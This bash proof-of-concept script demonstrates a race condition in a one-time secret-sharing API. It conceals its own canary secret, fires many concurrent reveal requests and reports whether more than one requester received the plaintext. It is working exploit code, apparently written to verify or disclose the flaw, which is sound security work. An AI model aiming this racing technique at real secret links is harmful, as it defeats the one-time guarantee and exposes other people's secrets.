#!/usr/bin/env bash
# PoC: TOCTOU race in the one-time guarantee.
# Conceals a secret, then fires N concurrent reveals and counts how many
# distinct requests receive the plaintext. A correct one-time secret store
# returns the plaintext to AT MOST ONE requester; >1 proves the race.
#
# Usage: race_reveal.sh [BASE_URL] [CONCURRENCY]
set -uo pipefail
BASE="${1:-http://127.0.0.1:3000}"
N="${2:-30}"
PLAINTEXT="RACE-CANARY-$(date +%s)-$RANDOM"
OUT=$(mktemp -d)

echo "[*] Base: $BASE   concurrency: $N   canary: $PLAINTEXT"

# 1. Conceal a secret (anonymous/guest)
CONCEAL=$(curl -s -X POST "$BASE/api/v2/secret/conceal" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "secret[secret]=$PLAINTEXT" \
  --data-urlencode "secret[ttl]=3600")
echo "[*] Conceal response:"; echo "$CONCEAL" | jq . 2>/dev/null || echo "$CONCEAL"

# Extract the shareable secret identifier (try common shapes)
SID=$(echo "$CONCEAL" | jq -r '
  .record.secret.identifier // .record.secret.secret_identifier //
  .record.secret.key // .record.secret.objid // empty' 2>/dev/null)
if [ -z "$SID" ]; then
  echo "[!] Could not auto-extract secret identifier; inspect response above."; exit 2
fi
echo "[*] Secret identifier: $SID"

# 2. Fire N concurrent reveals
echo "[*] Firing $N concurrent reveals..."
for i in $(seq 1 "$N"); do
  ( curl -s -X POST "$BASE/api/v2/secret/$SID/reveal" \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      --data-urlencode "continue=true" > "$OUT/resp_$i.json" ) &
done
wait

# 3. Count how many responses contained the plaintext canary
HITS=$(grep -l "$PLAINTEXT" "$OUT"/resp_*.json 2>/dev/null | wc -l | tr -d ' ')
echo "============================================================"
echo "[RESULT] Requests that received the plaintext: $HITS / $N"
if [ "$HITS" -gt 1 ]; then
  echo "[VULNERABLE] One-time guarantee BROKEN — secret revealed to $HITS requesters."
else
  echo "[OK] Plaintext returned to at most one requester in this run."
fi
echo "Sample responses saved under: $OUT"
